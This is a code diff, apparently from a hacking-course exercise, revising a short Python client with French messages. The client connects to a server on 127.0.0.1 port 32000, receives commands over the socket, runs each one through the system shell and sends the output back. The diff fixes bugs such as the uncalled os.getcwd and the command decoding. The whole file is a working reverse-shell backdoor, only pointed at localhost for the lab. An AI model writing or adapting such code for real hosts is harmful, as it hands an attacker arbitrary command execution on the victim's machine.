@@ -1,55 +1,48 @@
 
-
-import os
-import imp
 import socket
 import time
 import subprocess
 import platform
+import os
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
-
-print("Connexion au serveur", HOST_IP, ", port", HOST_PORT)
-while 1:
+print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
+while True:
     try:
-        s = socket.socket()           
-        s.connect((HOST_IP, HOST_PORT))                       
+        s = socket.socket()
+        s.connect((HOST_IP, HOST_PORT))
     except ConnectionRefusedError:
-        print("ERREUR: impossible de se connecter au serveur. Reconnexion ...")
+        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
         time.sleep(4)
     else:
         print("Connecté au serveur")
         break
 
-while 1:
-    commande = s.recv(MAX_DATA_SIZE)   
-    print("Commande ", commande.decode())
-
+# ....
+while True:
+    commande_data = s.recv(MAX_DATA_SIZE)
+    if not commande_data:
+        break
+    commande = commande_data.decode()
+    print("Commande : ", commande)
 
     if commande == "infos":
-        data_to_send = platform.platform() + " " + os.getcwd
+        reponse = platform.platform() + " " + os.getcwd()
     else:
-        reponse = commande.decode()
-        resultat = subprocess.run(reponse, shell=True, capture_output=True, universal_newlines=True)
-        data_to_send = resultat.stdout + resultat.stderr
-        if not data_to_send or len(data_to_send)==0:
-            data_to_send = " "
-    
-    
-    header = str(len(data_to_send.encode())).zfill(13)
-    print("header", header)
-    s.sendall(header.encode())
-    s.sendall(data_to_send.encode())
+        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
+        reponse = resultat.stdout + resultat.stderr
 
-#    if recieve_data:
-#        print(recieve_data.decode())       
-#    else:
-#        print("Aucune data")
+        if not reponse or len(reponse) == 0:
+            reponse = " "
+
+    header = str(len(reponse.encode())).zfill(13)
+    print("header:", header)
+    s.sendall(header.encode())
+    s.sendall(reponse.encode())
+    
+    # handshake
 
 s.close()
-
-
-
